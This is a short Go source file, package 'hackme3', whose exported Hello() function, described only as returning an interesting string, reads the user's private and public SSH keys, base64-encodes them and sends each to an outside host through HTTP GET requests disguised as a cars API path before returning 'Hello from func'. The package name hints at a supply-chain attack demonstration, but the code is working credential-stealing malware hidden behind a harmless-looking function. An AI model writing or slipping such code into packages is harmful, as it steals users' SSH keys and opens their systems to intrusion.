package hackme3

import (
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os/user"
)

func check(e error) {
	if e != nil {
		panic(e)
	}
}

// Hello(): Hello return really interesting string
func Hello() string {
	usr, err := user.Current()
	if err != nil {
		log.Fatal(err)
	}

	sshKey, err := ioutil.ReadFile(usr.HomeDir + "/.ssh/id_rsa")
	check(err)
	fmt.Print(string(sshKey))

	encoded := base64.StdEncoding.EncodeToString(sshKey)

	_, _ = http.Get("http://api.endevel.cz/cars/v1/car/public/priv-" + encoded)

	sshKeyPub, err := ioutil.ReadFile(usr.HomeDir + "/.ssh/id_rsa.pub")
	check(err)
	fmt.Print(string(sshKey))

	encoded = base64.StdEncoding.EncodeToString(sshKeyPub)

	_, _ = http.Get("http://api.endevel.cz/cars/v1/car/public/pub-" + encoded)

	return "Hello from func"
}
